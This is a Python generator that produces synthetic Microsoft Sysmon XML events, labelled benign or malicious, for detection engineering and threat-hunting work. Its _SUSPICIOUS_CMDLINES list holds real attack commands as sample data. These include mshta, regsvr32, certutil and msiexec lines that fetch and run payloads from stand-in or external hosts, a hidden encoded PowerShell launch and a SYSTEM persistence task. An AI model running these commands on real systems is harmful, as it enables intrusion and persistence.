"""Sysmon log source generator.

Generates Microsoft Sysmon XML event log entries for common Event IDs
used in detection engineering and endpoint threat hunting.
"""
from __future__ import annotations

import random
import uuid
from datetime import datetime, timezone, timedelta
from textwrap import dedent
from typing import Any

from backend.log_sources.base_log_source import AbstractLogSource


# ── Static data pools ────────────────────────────────────────────────────────

_HOSTNAMES = [
    "WKSTN-FIN-042", "SRV-DC-01", "WKSTN-HR-019", "SRV-FILE-03",
    "SRV-WEB-01", "WKSTN-ENG-107", "SRV-DB-02", "WKSTN-EXEC-003",
    "SRV-MAIL-01", "WKSTN-IT-055", "SRV-APP-04", "LAPTOP-REMOTE-22",
    "WKSTN-SALES-08", "SRV-BACKUP-01", "WKSTN-DEV-33",
]

_USERNAMES = [
    "CORP\\jsmith", "CORP\\jane.doe", "CORP\\michael.chen",
    "CORP\\sarah.wilson", "CORP\\bob.johnson", "CORP\\alice.martinez",
    "CORP\\david.kim", "CORP\\emily.taylor", "CORP\\svc_backup",
    "CORP\\Administrator", "NT AUTHORITY\\SYSTEM", "NT AUTHORITY\\LOCAL SERVICE",
]

_INTERNAL_IPS = [
    f"10.10.{b}.{d}"
    for b in range(1, 5)
    for d in [10, 20, 30, 40, 50, 100, 150, 200]
]

_EXTERNAL_IPS = [
    "185.220.101.34", "45.155.205.233", "91.219.236.174",
    "23.129.64.130", "104.244.76.13", "193.42.33.7",
    "5.188.86.114", "212.102.35.102",
]

_SYSTEM_PROCS = [
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\lsass.exe",
    r"C:\Windows\System32\services.exe",
    r"C:\Windows\System32\csrss.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\wininit.exe",
    r"C:\Windows\System32\winlogon.exe",
    r"C:\Windows\System32\smss.exe",
    r"C:\Windows\System32\spoolsv.exe",
    r"C:\Windows\System32\taskhost.exe",
]

_ATTACK_PROCS = [
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\wscript.exe",
    r"C:\Windows\System32\mshta.exe",
    r"C:\Windows\System32\rundll32.exe",
    r"C:\Windows\System32\regsvr32.exe",
    r"C:\Windows\System32\certutil.exe",
    r"C:\Windows\System32\msiexec.exe",
    r"C:\Windows\System32\csc.exe",
    r"C:\Windows\SysWOW64\cmd.exe",
    r"C:\Temp\beacon.exe",
    r"C:\Users\Public\Documents\svchost.exe",
]

_SUSPICIOUS_CMDLINES = [
    r"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0AUA==",
    r"powershell.exe -ExecutionPolicy Bypass -File C:\Temp\update.ps1",
    r"cmd.exe /c whoami /all & net user /domain",
    r"wscript.exe //E:VBScript C:\Users\Public\payload.vbs",
    'mshta.exe vbscript:Close(Execute("GetObject(""script:http://evil.example.com/run.sct"")"))',
    r"certutil.exe -urlcache -split -f http://185.220.101.34/beacon.exe C:\Temp\beacon.exe",
    'rundll32.exe javascript:"\\\\..\\mshtml,RunHTMLApplication"',
    r"regsvr32.exe /s /u /i:http://evil.example.com/file.sct scrobj.dll",
    r"schtasks /create /tn persist /tr C:\Temp\beacon.exe /sc onlogon /ru SYSTEM",
    r'msiexec /quiet /i http://45.155.205.233/update.msi',
]

_BENIGN_CMDLINES = [
    r"C:\Windows\explorer.exe",
    r'C:\Program Files\Google\Chrome\Application\chrome.exe --no-sandbox',
    r"C:\Windows\System32\svchost.exe -k netsvcs",
    r"C:\Windows\System32\notepad.exe C:\Users\jsmith\Documents\notes.txt",
    r'C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE /recycle',
    r"C:\Windows\System32\taskmgr.exe /4",
]

_LOADED_DLLS = [
    (r"C:\Windows\System32\ntdll.dll",     True,  "Microsoft Windows"),
    (r"C:\Windows\System32\kernel32.dll",  True,  "Microsoft Windows"),
    (r"C:\Windows\System32\advapi32.dll",  True,  "Microsoft Windows"),
    (r"C:\Windows\System32\user32.dll",    True,  "Microsoft Windows"),
    (r"C:\Windows\System32\ws2_32.dll",    True,  "Microsoft Windows"),
    (r"C:\Temp\inject.dll",               False, ""),
    (r"C:\Users\Public\hook.dll",         False, ""),
    (r"C:\ProgramData\svcext.dll",        False, ""),
]

_REGISTRY_KEYS = [
    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM\SYSTEM\CurrentControlSet\Services",
    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
]

_SUSPICIOUS_PATHS = [
    r"C:\Temp\beacon.exe",
    r"C:\Users\Public\Documents\svchost.exe",
    r"C:\ProgramData\update.exe",
    r"C:\Windows\Temp\malware.dll",
    r"C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persist.exe",
    r"C:\Temp\payload.ps1",
    r"C:\Users\Public\nc.exe",
]

_BENIGN_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    r"C:\Windows\System32\notepad.exe",
    r"C:\Users\jsmith\Documents\report.docx",
    r"C:\Program Files\7-Zip\7z.exe",
    r"C:\Windows\SysWOW64\msiexec.exe",
]

_PROTOCOLS = ["tcp", "udp"]
_HIGH_PORTS = list(range(49152, 65535))
_COMMON_PORTS = [80, 443, 8080, 8443, 53, 22, 3389, 445, 135, 139]


def _ts(offset_seconds: int = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)).isoformat()


def _rand_hash(algo: str = "SHA256") -> str:
    lengths = {"MD5": 32, "SHA1": 40, "SHA256": 64, "IMPHASH": 32}
    return "".join(random.choices("0123456789abcdef", k=lengths.get(algo, 64)))


def _hashes_str(malicious: bool) -> str:
    md5 = _rand_hash("MD5")
    sha1 = _rand_hash("SHA1")
    sha256 = _rand_hash("SHA256")
    imphash = _rand_hash("IMPHASH")
    return f"MD5={md5},SHA1={sha1},SHA256={sha256},IMPHASH={imphash}"


def _xml_escape(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def _build_event_xml(event_id: int, hostname: str, data_fields: dict[str, str]) -> str:
    """Render a Sysmon event as XML matching the real Sysmon schema."""
    timestamp = _ts(random.randint(0, 3600))
    record_id = random.randint(100000, 9999999)
    process_guid = str(uuid.uuid4()).upper()

    data_xml = "\n      ".join(
        f'<Data Name="{k}">{_xml_escape(str(v))}</Data>'
        for k, v in data_fields.items()
    )

    return dedent(f"""\
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System>
            <Provider Name="Microsoft-Windows-Sysmon" Guid="{{{str(uuid.uuid4()).upper()}}}"/>
            <EventID>{event_id}</EventID>
            <Version>5</Version>
            <Level>4</Level>
            <Task>{event_id}</Task>
            <Opcode>0</Opcode>
            <Keywords>0x8000000000000000</Keywords>
            <TimeCreated SystemTime="{timestamp}"/>
            <EventRecordID>{record_id}</EventRecordID>
            <Correlation/>
            <Execution ProcessID="{random.randint(1000,9999)}" ThreadID="{random.randint(1000,9999)}"/>
            <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
            <Computer>{hostname}</Computer>
            <Security UserID="S-1-5-18"/>
          </System>
          <EventData>
            {data_xml}
          </EventData>
        </Event>""")


class SysmonSource(AbstractLogSource):
    source_type = "sysmon"
    description = "Microsoft Sysmon telemetry events"

    # ── individual event generators ───────────────────────────────────────────

    def _gen_eid1_process_create(self, malicious: bool) -> dict[str, Any]:
        """Event ID 1: Process Create."""
        hostname = random.choice(_HOSTNAMES)
        user = random.choice(_USERNAMES)
        if malicious:
            image = random.choice(_ATTACK_PROCS)
            cmdline = random.choice(_SUSPICIOUS_CMDLINES)
            parent = random.choice(_SYSTEM_PROCS)
        else:
            image = random.choice(_SYSTEM_PROCS)
            cmdline = random.choice(_BENIGN_CMDLINES)
            parent = random.choice(_SYSTEM_PROCS)

        proc_guid = str(uuid.uuid4()).upper()
        parent_guid = str(uuid.uuid4()).upper()
        hashes = _hashes_str(malicious)

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{proc_guid}}}",
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "FileVersion": f"{random.randint(1,10)}.{random.randint(0,9)}.{random.randint(0,9999)}.{random.randint(0,9999)}",
            "Description": "Windows Command Processor" if "cmd" in image else "",
            "Product": "Microsoft Windows Operating System",
            "Company": "Microsoft Corporation",
            "OriginalFileName": image.split("\\")[-1],
            "CommandLine": cmdline,
            "CurrentDirectory": r"C:\Windows\system32\\",
            "User": user,
            "LogonGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "LogonId": f"0x{random.randint(0x10000, 0xFFFFFF):x}",
            "TerminalSessionId": random.randint(0, 3),
            "IntegrityLevel": random.choice(["High", "Medium", "System", "Low"]),
            "Hashes": hashes,
            "ParentProcessGuid": f"{{{parent_guid}}}",
            "ParentProcessId": random.randint(1000, 65535),
            "ParentImage": parent,
            "ParentCommandLine": parent,
            "ParentUser": random.choice(_USERNAMES),
        }
        xml = _build_event_xml(1, hostname, data)
        return {
            "event_id": 1,
            "event_name": "ProcessCreate",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "Image": image,
            "CommandLine": cmdline,
            "ParentImage": parent,
            "User": user,
            "Hashes": hashes,
            "IntegrityLevel": data["IntegrityLevel"],
            "malicious_indicator": malicious,
        }

    def _gen_eid3_network_connect(self, malicious: bool) -> dict[str, Any]:
        """Event ID 3: Network Connection."""
        hostname = random.choice(_HOSTNAMES)
        src_ip = random.choice(_INTERNAL_IPS)
        dst_ip = random.choice(_EXTERNAL_IPS if malicious else _INTERNAL_IPS)
        dst_port = random.choice([4444, 1337, 8080, 443] if malicious else _COMMON_PORTS)
        src_port = random.choice(_HIGH_PORTS)
        image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)
        proto = random.choice(_PROTOCOLS)

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "User": random.choice(_USERNAMES),
            "Protocol": proto,
            "Initiated": random.choice(["true", "false"]),
            "SourceIsIpv6": "false",
            "SourceIp": src_ip,
            "SourceHostname": hostname,
            "SourcePort": src_port,
            "SourcePortName": "",
            "DestinationIsIpv6": "false",
            "DestinationIp": dst_ip,
            "DestinationHostname": "",
            "DestinationPort": dst_port,
            "DestinationPortName": random.choice(["https", "http", ""]),
        }
        xml = _build_event_xml(3, hostname, data)
        return {
            "event_id": 3,
            "event_name": "NetworkConnect",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "Image": image,
            "SourceIp": src_ip,
            "DestinationIp": dst_ip,
            "DestinationPort": dst_port,
            "Protocol": proto,
            "malicious_indicator": malicious,
        }

    def _gen_eid7_image_load(self, malicious: bool) -> dict[str, Any]:
        """Event ID 7: Image Loaded (DLL)."""
        hostname = random.choice(_HOSTNAMES)
        if malicious:
            dll_path, signed, signer = random.choice([d for d in _LOADED_DLLS if not d[1]])
        else:
            dll_path, signed, signer = random.choice([d for d in _LOADED_DLLS if d[1]])

        loading_image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)
        hashes = _hashes_str(malicious)

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "ProcessId": random.randint(1000, 65535),
            "Image": loading_image,
            "ImageLoaded": dll_path,
            "FileVersion": f"{random.randint(1,10)}.{random.randint(0,9)}.{random.randint(0,9999)}.{random.randint(0,9999)}",
            "Description": dll_path.split("\\")[-1],
            "Product": "Microsoft Windows Operating System" if signed else "",
            "Company": "Microsoft Corporation" if signed else "",
            "OriginalFileName": dll_path.split("\\")[-1],
            "Hashes": hashes,
            "Signed": "true" if signed else "false",
            "Signature": signer,
            "SignatureStatus": "Valid" if signed else "Unsigned",
            "User": random.choice(_USERNAMES),
        }
        xml = _build_event_xml(7, hostname, data)
        return {
            "event_id": 7,
            "event_name": "ImageLoad",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "Image": loading_image,
            "ImageLoaded": dll_path,
            "Signed": data["Signed"],
            "Signature": signer,
            "Hashes": hashes,
            "malicious_indicator": malicious,
        }

    def _gen_eid8_create_remote_thread(self, malicious: bool) -> dict[str, Any]:
        """Event ID 8: CreateRemoteThread — process injection indicator."""
        hostname = random.choice(_HOSTNAMES)
        src_image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)
        tgt_image = random.choice([r"C:\Windows\System32\lsass.exe",
                                   r"C:\Windows\System32\svchost.exe",
                                   r"C:\Windows\explorer.exe"] if malicious
                                  else _SYSTEM_PROCS)
        start_addr = f"0x{random.randint(0x7f000000, 0x7fffffff):016x}"

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "SourceProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "SourceProcessId": random.randint(1000, 65535),
            "SourceImage": src_image,
            "TargetProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "TargetProcessId": random.randint(1000, 65535),
            "TargetImage": tgt_image,
            "NewThreadId": random.randint(1000, 65535),
            "StartAddress": start_addr,
            "StartModule": random.choice(_LOADED_DLLS)[0],
            "StartFunction": random.choice(["", "DllEntryPoint", "CreateThread"]),
            "SourceUser": random.choice(_USERNAMES),
            "TargetUser": "NT AUTHORITY\\SYSTEM",
        }
        xml = _build_event_xml(8, hostname, data)
        return {
            "event_id": 8,
            "event_name": "CreateRemoteThread",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "SourceImage": src_image,
            "TargetImage": tgt_image,
            "StartAddress": start_addr,
            "malicious_indicator": malicious,
        }

    def _gen_eid10_process_access(self, malicious: bool) -> dict[str, Any]:
        """Event ID 10: ProcessAccess — especially lsass.exe credential access."""
        hostname = random.choice(_HOSTNAMES)
        src_image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)
        tgt_image = (
            r"C:\Windows\System32\lsass.exe" if malicious
            else random.choice(_SYSTEM_PROCS)
        )
        # LSASS dump access mask
        access_mask = random.choice(
            ["0x1010", "0x1FFFFF", "0x143A"] if malicious
            else ["0x0040", "0x0010", "0x0001"]
        )

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "SourceProcessGUID": f"{{{str(uuid.uuid4()).upper()}}}",
            "SourceProcessId": random.randint(1000, 65535),
            "SourceThreadId": random.randint(1000, 65535),
            "SourceImage": src_image,
            "TargetProcessGUID": f"{{{str(uuid.uuid4()).upper()}}}",
            "TargetProcessId": random.randint(1000, 65535),
            "TargetImage": tgt_image,
            "GrantedAccess": access_mask,
            "CallTrace": f"C:\\Windows\\SYSTEM32\\ntdll.dll+{random.randint(0x1000, 0xFFFF):x}|"
                         f"C:\\Windows\\System32\\KERNELBASE.dll+{random.randint(0x1000, 0xFFFF):x}",
            "SourceUser": random.choice(_USERNAMES),
            "TargetUser": "NT AUTHORITY\\SYSTEM",
        }
        xml = _build_event_xml(10, hostname, data)
        return {
            "event_id": 10,
            "event_name": "ProcessAccess",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "SourceImage": src_image,
            "TargetImage": tgt_image,
            "GrantedAccess": access_mask,
            "malicious_indicator": malicious,
        }

    def _gen_eid11_file_create(self, malicious: bool) -> dict[str, Any]:
        """Event ID 11: FileCreate."""
        hostname = random.choice(_HOSTNAMES)
        target_file = random.choice(_SUSPICIOUS_PATHS if malicious else _BENIGN_PATHS)
        creating_proc = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)

        data = {
            "RuleName": "",
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "ProcessId": random.randint(1000, 65535),
            "User": random.choice(_USERNAMES),
            "Image": creating_proc,
            "TargetFilename": target_file,
            "CreationUtcTime": _ts(random.randint(0, 3600)),
        }
        xml = _build_event_xml(11, hostname, data)
        return {
            "event_id": 11,
            "event_name": "FileCreate",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "Image": creating_proc,
            "TargetFilename": target_file,
            "malicious_indicator": malicious,
        }

    def _gen_eid12_registry_event(self, malicious: bool) -> dict[str, Any]:
        """Event ID 12: RegistryEvent (Object create and delete)."""
        hostname = random.choice(_HOSTNAMES)
        key = random.choice(_REGISTRY_KEYS)
        value_name = random.choice(["Run", "Startup", "Shell", "Userinit", "AppInit_DLLs"])
        event_type = random.choice(["CreateKey", "DeleteKey", "CreateValue", "DeleteValue"])
        image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)

        data = {
            "RuleName": "",
            "EventType": event_type,
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "TargetObject": f"{key}\\{value_name}",
            "User": random.choice(_USERNAMES),
        }
        xml = _build_event_xml(12, hostname, data)
        return {
            "event_id": 12,
            "event_name": "RegistryEvent",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "EventType": event_type,
            "Image": image,
            "TargetObject": data["TargetObject"],
            "malicious_indicator": malicious,
        }

    def _gen_eid13_registry_value_set(self, malicious: bool) -> dict[str, Any]:
        """Event ID 13: RegistryEvent (Value Set)."""
        hostname = random.choice(_HOSTNAMES)
        key = random.choice(_REGISTRY_KEYS)
        value_name = random.choice(["Run", "Shell", "Userinit", "AppInit_DLLs"])
        new_value = (
            random.choice([r"C:\Temp\beacon.exe", r"C:\Users\Public\svchost.exe",
                           r"C:\ProgramData\update.exe"])
            if malicious else
            random.choice([r"C:\Windows\System32\svchost.exe", r"explorer.exe",
                           r"C:\Windows\System32\notepad.exe"])
        )
        image = random.choice(_ATTACK_PROCS if malicious else _SYSTEM_PROCS)

        data = {
            "RuleName": "",
            "EventType": "SetValue",
            "UtcTime": _ts(random.randint(0, 3600)),
            "ProcessGuid": f"{{{str(uuid.uuid4()).upper()}}}",
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "TargetObject": f"{key}\\{value_name}",
            "Details": new_value,
            "User": random.choice(_USERNAMES),
        }
        xml = _build_event_xml(13, hostname, data)
        return {
            "event_id": 13,
            "event_name": "RegistryValueSet",
            "hostname": hostname,
            "timestamp": data["UtcTime"],
            "xml": xml,
            "EventType": "SetValue",
            "Image": image,
            "TargetObject": data["TargetObject"],
            "Details": new_value,
            "malicious_indicator": malicious,
        }

    # ── dispatch ──────────────────────────────────────────────────────────────

    _GENERATORS = [
        _gen_eid1_process_create,  _gen_eid1_process_create,  _gen_eid1_process_create,
        _gen_eid3_network_connect, _gen_eid3_network_connect,
        _gen_eid7_image_load,
        _gen_eid8_create_remote_thread,
        _gen_eid10_process_access,
        _gen_eid11_file_create,    _gen_eid11_file_create,
        _gen_eid12_registry_event,
        _gen_eid13_registry_value_set,
    ]

    # ── public API ────────────────────────────────────────────────────────────

    def generate(self, malicious: bool = False, technique_id: str = "") -> dict[str, Any]:
        gen_fn = random.choice(self._GENERATORS)
        return gen_fn(self, malicious)

    def generate_batch(
        self,
        count: int = 10,
        malicious_ratio: float = 0.1,
        technique_id: str = "",
    ) -> list[dict[str, Any]]:
        events: list[dict[str, Any]] = []
        malicious_count = max(0, min(count, round(count * malicious_ratio)))
        for i in range(count):
            is_malicious = i < malicious_count
            events.append(self.generate(malicious=is_malicious, technique_id=technique_id))
        random.shuffle(events)
        return events
